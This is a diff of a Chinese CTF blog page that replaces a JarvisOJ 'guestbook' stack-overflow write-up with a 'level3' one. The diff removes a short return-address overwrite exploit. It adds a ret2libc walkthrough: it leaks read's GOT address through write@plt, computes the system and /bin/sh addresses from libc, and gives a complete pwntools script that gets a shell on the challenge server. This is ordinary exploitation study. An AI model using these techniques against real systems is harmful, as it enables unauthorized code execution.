@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>JarvisOJ guestbook | GoldsNow</title>
+  <title>JarvisOJ level3 | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+  <meta name="description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JarvisOJ guestbook">
-<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/index.html">
+<meta property="og:title" content="JarvisOJ level3">
+<meta property="og:url" content="https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
-<meta property="og:updated_time" content="2017-03-24T02:58:51.849Z">
+<meta property="og:description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
+<meta property="og:updated_time" content="2017-03-24T15:21:02.469Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JarvisOJ guestbook">
-<meta name="twitter:description" content="这是一题简单的栈溢出题，覆盖返回值即可">
+<meta name="twitter:title" content="JarvisOJ level3">
+<meta name="twitter:description" content="这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -216,11 +216,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-[JarvisOJ]guestbook" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-[JarvisOJ]level3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/24/[JarvisOJ]guestbook/" class="article-date">
-      <time datetime="2017-03-24T02:28:00.000Z" itemprop="datePublished">2017-03-24</time>
+      <a href="/2017/03/24/[JarvisOJ]level3/" class="article-date">
+      <time datetime="2017-03-24T14:49:00.000Z" itemprop="datePublished">2017-03-24</time>
 </a>
     </div>
   
@@ -233,7 +233,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      JarvisOJ guestbook
+      JarvisOJ level3
     </h1>
   
 
@@ -258,10 +258,51 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  __int64 v4; <span class="comment">// [sp+0h] [bp-88h]@1</span></div><div class="line"></div><div class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">0x14</span>uLL);</div><div class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>uLL);</div><div class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以发现这里的v4只有0x88的栈空间，而可以输入的长度为0x14<br>所以存在着溢出。这个程序还有一个后面代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  FILE *v0; <span class="comment">// rbx@1</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Fh] [bp-9h]@2</span></div><div class="line"></div><div class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    result = fgetc(v0);</div><div class="line">    buf = result;</div><div class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>记录地址为<code>0x400620</code><br>所以exp为<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">addr_goodgame= <span class="number">0x400620</span></div><div class="line">shellcode = <span class="string">'a'</span>*<span class="number">136</span>+p64(addr_goodgame)</div></pre></td></tr></table></figure></p>
-
+        <p>这个题目虽然和前几个的结构差不多，但是减少了 system 和 /bin/sh ，而是给了一个libc.so 需要自己从里面找到地址</p>
+<a id="more"></a>
+<p>首先checksec下</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre><p>发现堆栈不可执行。</p>
+<p>这里就需要用到write函数来leak地址了。</p>
+<p>所以ret所对应的eip为 plt_write = 0x08048340</p>
+<p>使用write函数需要有三个参数，就是<code>ssize_t write(int fd,const void *buf,size_t nbytes)</code></p>
+<p>fd = 1 的时候是使用标准输入</p>
+<p>因为需要构造write来使得 read的真实地址泄漏<br>所以 我们使用write的三个参数为<code>1  got_read len(got_read)=4</code></p>
+<table>
+<thead>
+<tr>
+<th>stack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>write</td>
+</tr>
+<tr>
+<td>addr_fun</td>
+</tr>
+<tr>
+<td>1</td>
+</tr>
+<tr>
+<td>read_got</td>
+</tr>
+<tr>
+<td>4</td>
+</tr>
+</tbody>
+</table>
+<p>这样子就可以leak read的真是地址，并且还能够在运行一次fun函数</p>
+<p>接下来就是找system的真实地址了。在libc里找</p>
+<p><code>system = libc_system - libc_read + true_read</code></p>
+<p>/bin/sh 可以通过 <code>strings -a -t x ./level3 | grep /bin/sh</code> 来找到地址，或者直接通过ida等工具</p>
+<p>最后通过的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</div><div class="line"></div><div class="line">plt_write = <span class="number">0x08048340</span></div><div class="line">got_read  = <span class="number">0x0804A00C</span></div><div class="line">addr_func = <span class="number">0x0804844B</span></div><div class="line"></div><div class="line">shellcode = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(plt_write)+p32(addr_func)+p32(<span class="number">1</span>)+p32(got_read)+p32(<span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</div><div class="line">p.sendline(shellcode)</div><div class="line"></div><div class="line">tmp = p.recv(<span class="number">4</span>)</div><div class="line"><span class="keyword">print</span> tmp</div><div class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</div><div class="line"></div><div class="line">addr_read = u32(tmp[<span class="number">0</span>:<span class="number">4</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'read_got ='</span>,addr_read</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line">libc_binsh = <span class="number">0x16084c</span></div><div class="line">addr_system = libc.symbols[<span class="string">'system'</span>]- libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line">addr_binsh =  libc_binsh            - libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line">addr_exit =   libc.symbols[<span class="string">'exit'</span>]  - libc.symbols[<span class="string">'read'</span>] + addr_read</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span>+<span class="string">'bbbb'</span>+p32(addr_system)+p32(addr_exit)+p32(addr_binsh)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
       
       
     </div>
@@ -270,13 +311,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]guestbook/">JarvisOJ guestbook</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/24/[JarvisOJ]level3/">JarvisOJ level3</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
-        <p><span>发布时间:</span>2017年03月24日 - 10时28分</p>
-        <p><span>最后更新:</span>2017年03月24日 - 10时58分</p>
+        <p><span>发布时间:</span>2017年03月24日 - 22时49分</p>
+        <p><span>最后更新:</span>2017年03月24日 - 23时21分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]guestbook/" title="JarvisOJ guestbook">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]guestbook/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/24/[JarvisOJ]level3/" title="JarvisOJ level3">https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/24/[JarvisOJ]level3/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -289,18 +330,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/03/24/[JarvisOJ]level_x64/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          JarvisOJ level2_x64
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/03/23/3-22 整理/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF の 套路</div>
+    <a href="/2017/03/24/[JarvisOJ]level0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JarvisOJ level0</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -362,13 +394,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/24/[JarvisOJ]level_x64/" title="上一篇: JarvisOJ level2_x64">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/03/23/3-22 整理/" title="下一篇: CTF の 套路">
+            <a href="/2017/03/24/[JarvisOJ]level0/" title="下一篇: JarvisOJ level0">
                 <i class="fa fa-angle-right"></i>
             </a>
         
